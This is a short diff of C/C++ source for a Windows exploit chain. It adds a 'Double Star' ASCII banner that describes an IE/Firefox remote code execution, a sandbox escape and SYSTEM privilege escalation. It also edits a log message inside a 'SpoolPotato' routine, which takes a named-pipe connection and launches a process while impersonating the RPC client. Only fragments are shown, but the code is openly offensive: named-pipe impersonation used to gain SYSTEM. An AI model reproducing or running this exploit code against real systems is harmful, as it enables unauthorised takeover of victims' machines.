@@ -1,3 +1,13 @@
+/*
+________                 ___.    .__                 _________  __
+\______ \    ____   __ __\_ |__  |  |    ____       /   _____/_/  |_ _____  _______
+ |    |  \  /  _ \ |  |  \| __ \ |  |  _/ __ \      \_____  \ \   __\\__  \ \_  __ \
+ |    `   \(  <_> )|  |  /| \_\ \|  |__\  ___/      /        \ |  |   / __ \_|  | \/
+/_______  / \____/ |____/ |___  /|____/ \___  >    /_______  / |__|  (____  /|__|
+        \/                    \/            \/             \/             \/
+Windows 7/8.1 IE/Firefox RCE -> Sandbox Escape -> SYSTEM EoP Exploit Chain
+*/
+
 #include <Windows.h>
 #include <strsafe.h>
 #include <sddl.h>
@@ -307,7 +317,7 @@ BOOL SpoolPotato() {
                 DebugLog(L"... recieved connection over named pipe");
 
                 if (LaunchImpersonatedProcess(hSpoolPipe, COMMAND_LINE, WTSGetActiveConsoleSessionId(), INTERACTIVE_PROCESS)) {
-                    DebugLog(L"... successfully launched process while impersonating RPC client. Syncing event file with WPAD client...");
+                    DebugLog(L"... successfully launched process while impersonating RPC client. Syncing event object with WPAD client...");
 
                     /*
                     SpoolPotato/WPAD client synchronization
